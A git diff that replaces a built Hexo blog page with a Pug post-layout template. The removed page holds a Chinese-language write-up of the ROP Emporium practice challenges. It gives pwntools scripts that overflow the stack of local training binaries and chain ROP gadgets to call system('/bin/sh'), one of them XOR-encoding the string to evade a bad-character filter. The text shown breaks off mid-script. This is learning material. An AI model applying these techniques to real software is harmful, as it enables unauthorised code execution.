@@ -1,287 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>rop_emporium_wp - Watch Security</title>
-
-<meta name="keywords" content="pwn">
-
-<meta name="description " content="">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-03-28">2019-03-28</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">ROP_emporium_WP</h2>
-            <div class="post-meta">
-                本文总共9940个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="为什么记录"><a href="#为什么记录" class="headerlink" title="为什么记录"></a>为什么记录</h3><pre><code>在学习pwn的入门过程中，这一系列的练习给了我很多的帮助，包括踩坑。让我更加直观地体验到了构造ROP的乐趣。学习到了基本的pwn思维。本篇文章不作为学习的参考，只是记录我的轨迹。
-</code></pre><h3 id="0x01-ret2win"><a href="#0x01-ret2win" class="headerlink" title="0x01 ret2win"></a>0x01 ret2win</h3><pre><code>**Idea:**
-
-这里直接给出了一个cat flag的函数。我们只需要用这个函数的地址覆盖pwnme函数返回地址即可。
-</code></pre><h2 id="ret2win32"><a href="#ret2win32" class="headerlink" title="ret2win32"></a>ret2win32</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x08048659</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>) + p32(win_addr)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ret2win64"><a href="#ret2win64" class="headerlink" title="ret2win64"></a>ret2win64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x400811</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span> + <span class="number">0x08</span>) + p64(win_addr)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-split"><a href="#0x02-split" class="headerlink" title="0x02 split"></a>0x02 split</h3><pre><code>**Idea:**
-
-程序存在栈溢出，并且提供了system函数，通过查找也能找到cat flag.txt的指令。所以很明显的构造payload即可。
-</code></pre><h2 id="Split-32bit"><a href="#Split-32bit" class="headerlink" title="Split 32bit"></a>Split 32bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./split32'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">main_addr = <span class="number">0x0804857B</span></span><br><span class="line">pwnme_addr = <span class="number">0x080485F6</span></span><br><span class="line">sys_addr = <span class="number">0x08048657</span></span><br><span class="line">binsh_addr = <span class="number">0x0804A030</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>) + p32(sys_addr) + p32(pwnme_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Split-64bit"><a href="#Split-64bit" class="headerlink" title="Split 64bit"></a>Split 64bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x400810</span> </span><br><span class="line">binsh_addr = <span class="number">0x0601060</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400883</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span> + <span class="number">0x08</span>) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-callme"><a href="#0x03-callme" class="headerlink" title="0x03 callme"></a>0x03 callme</h3><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea:"></a><strong>Idea:</strong></h3><pre><code>程序存在栈溢出，并且在usefulFunction中调用了三个函数，callmeone\two\three。可以发现这三个函数来自.so文件。查看文件得知，三个函数都需要三个参数1、2、3.分别完成打开加密文件、打开key1文件、打开key2文件并输出flag的功能。所以我们需要尝试控制返回函数的参数（注意形参在栈中的位置）。
-</code></pre><h2 id="callme-32bit"><a href="#callme-32bit" class="headerlink" title="callme 32bit"></a>callme 32bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line">callme_one = <span class="number">0x80485c0</span></span><br><span class="line">callme_two = <span class="number">0x8048620</span></span><br><span class="line">callme_three = <span class="number">0x80485b0</span></span><br><span class="line">pop3_ret = <span class="number">0x080488a9</span></span><br><span class="line">pwnme = <span class="number">0x080487B6</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">payload = </span><br><span class="line"><span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>) + p32(callme_one) + p32(pop3_ret) + p32(<span class="number">1</span>) + p32(<span class="number">2</span>) + p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_two) + p32(pop3_ret) + p32(<span class="number">1</span>) + p32(<span class="number">2</span>) + p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_three) + p32(pwnme) + p32(<span class="number">1</span>) + p32(<span class="number">2</span>) + p32(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="callme-64bit"><a href="#callme-64bit" class="headerlink" title="callme 64bit"></a>callme 64bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./callme'</span>)</span><br><span class="line">callme_one = <span class="number">0x401850</span></span><br><span class="line">callme_two = <span class="number">0x401870</span></span><br><span class="line">callme_three = <span class="number">0x401810</span></span><br><span class="line"><span class="comment">#pop3_ret = 0x401ab0</span></span><br><span class="line">pop_rdi = <span class="number">0x401b23</span></span><br><span class="line">pop_rsi_rdx = <span class="number">0x401ab1</span></span><br><span class="line">pwnme = <span class="number">0x401a05</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_rdx) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(callme_one)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_rdx) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(callme_two)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_rdx) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(callme_three)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-Wite4"><a href="#0x04-Wite4" class="headerlink" title="0x04 Wite4"></a>0x04 Wite4</h3><pre><code>**Idea:**
-
-这次，并没有给我们有用的string。但是我们有system。所以，目的很明确，想办法写入自己的string。
-</code></pre><p>除了read、get、等我们见到的读入函数外，在rop里面常用到的指令级别的读入，就是pop|mov|ret的组合了。</p>
-<p>而写入的地址，最常见的就是.bss段。除此，我们也可以vmap查看一下内存的各部分权限（读写）自己选择合适的写入位置（这里仍然是.bss段）</p>
-<h2 id="Write4-32bit"><a href="#Write4-32bit" class="headerlink" title="Write4 32bit"></a>Write4 32bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./write432'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8048430</span></span><br><span class="line"><span class="comment">#Must be the Root Address</span></span><br><span class="line">bss_addr = <span class="number">0x804A040</span></span><br><span class="line"></span><br><span class="line">command = <span class="number">0x8048754</span></span><br><span class="line">pop_edi_edp_ret = <span class="number">0x080486da</span></span><br><span class="line">mov_edi_edp_ret = <span class="number">0x08048670</span></span><br><span class="line"><span class="comment">#Why cutdown</span></span><br><span class="line"><span class="comment">#one breakpoint 0x0804864B</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'************get shell**********'</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>)</span><br><span class="line">payload += p32(pop_edi_edp_ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += <span class="string">"sh\x00\x00"</span></span><br><span class="line">payload += p32(mov_edi_edp_ret)</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid =&gt;'</span> + str(proc.pidof(p))</span><br><span class="line"><span class="comment">#raw_input('attach me')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Write4-64bit"><a href="#Write4-64bit" class="headerlink" title="Write4 64bit"></a>Write4 64bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./write4'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400810</span></span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">pop_r14_r15_ret = <span class="number">0x400890</span></span><br><span class="line">mov_r14_r15_ret= <span class="number">0x400820</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400893</span></span><br><span class="line"><span class="comment">#Why cutdown</span></span><br><span class="line"><span class="comment">#one breakpoint </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'************get shell**********'</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span> + <span class="number">0x08</span>)</span><br><span class="line">payload += p64(pop_r14_r15_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += p64(mov_r14_r15_ret)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid =&gt;'</span> + str(proc.pidof(p))</span><br><span class="line">raw_input(<span class="string">'attach me'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="0x05-badchars"><a href="#0x05-badchars" class="headerlink" title="0x05 badchars"></a>0x05 badchars</h3><pre><code>**Idea:**
-
-有时候，程序会对输入的payload进行检查，诸如&quot;/bin/sh&quot;的字符串很可能被检测到而进行破坏。
-</code></pre><p>这时候，我们需要把payload进行“加密”，执行getshell操作前，再进行“解密”。最常用的加密操作就是xor了，并且加解密同用一段ROP链。</p>
-<h2 id="badchars-32bit"><a href="#badchars-32bit" class="headerlink" title="badchars 32bit"></a>badchars 32bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./badchars32'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#*******************ROPgadget*************</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#The two help us to write the en_command in .bss</span></span><br><span class="line">pop_esi_edi_ret = <span class="number">0x08048899</span></span><br><span class="line">mov_edi_esi_ret = <span class="number">0x08048893</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#The two help us to decode the command in .bss</span></span><br><span class="line">pop_ebx_ecx_ret = <span class="number">0x08048896</span></span><br><span class="line">xor_ebx_cl_ret = <span class="number">0x08048890</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080484E0</span></span><br><span class="line">bss_addr = <span class="number">0x0804A040</span></span><br><span class="line">sh = <span class="string">"sh\x00\x00"</span></span><br><span class="line">xor_value = <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">xorsh = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#xor ======= encode</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	xorsh += chr(ord(sh[i]) ^ xor_value)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'c'</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>)</span><br><span class="line">payload += p32(pop_esi_edi_ret)</span><br><span class="line">payload += xorsh</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(mov_edi_esi_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#xor ======= decode</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	payload += p32(pop_ebx_ecx_ret)</span><br><span class="line">	payload += p32(bss_addr + i)</span><br><span class="line">	payload += p32(xor_value)</span><br><span class="line">	payload += p32(xor_ebx_cl_ret)</span><br><span class="line"></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#breakpoint 0x080487A8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid ==&gt; '</span> + str(proc.pidof(p))</span><br><span class="line">raw_input(<span class="string">'attach me'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="badchars-64bit"><a href="#badchars-64bit" class="headerlink" title="badchars 64bit"></a>badchars 64bit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./badchars'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#********************ROPgadget***************'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#The two help us to write the en_shellcode in .bss</span></span><br><span class="line">pop_r12_r13_ret = <span class="number">0x400b3b</span></span><br><span class="line">mov_r13_r12_ret = <span class="number">0x400b34</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#The gadgets help us xor the shellocde</span></span><br><span class="line">pop_r14_r15_ret = <span class="number">0x400b40</span></span><br><span class="line">xor_r15_r14_ret = <span class="number">0x400B30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#call system</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400b39</span></span><br><span class="line">system_addr = <span class="number">0x4006F0</span></span><br><span class="line"></span><br><span class="line">sh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">xorsh = <span class="string">''</span></span><br><span class="line">xorvalue = <span class="number">3</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line"><span class="comment">#xor to encode the /bin/sh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	xorsh += chr(ord(sh[i]) ^ xorvalue)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span> + <span class="number">0x08</span>)</span><br><span class="line">payload += p64(pop_r12_r13_ret)</span><br><span class="line">payload += xorsh</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(mov_r13_r12_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#decode the /bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	payload += p64(pop_r14_r15_ret)</span><br><span class="line">	payload += 